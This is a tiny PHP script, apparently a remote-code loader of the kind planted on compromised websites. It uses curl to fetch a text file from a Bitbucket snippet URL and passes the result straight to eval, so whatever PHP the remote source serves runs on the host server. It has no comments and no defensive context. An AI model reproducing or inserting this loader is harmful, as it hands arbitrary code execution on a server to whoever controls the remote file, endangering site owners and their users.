<?php
    $Url = "https://bitbucket.org/!api/2.0/snippets/manimandz/xqkaar/c2cbf2317edaa1f8f6acf91b7d4184932b97a80d/files/z.txt";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>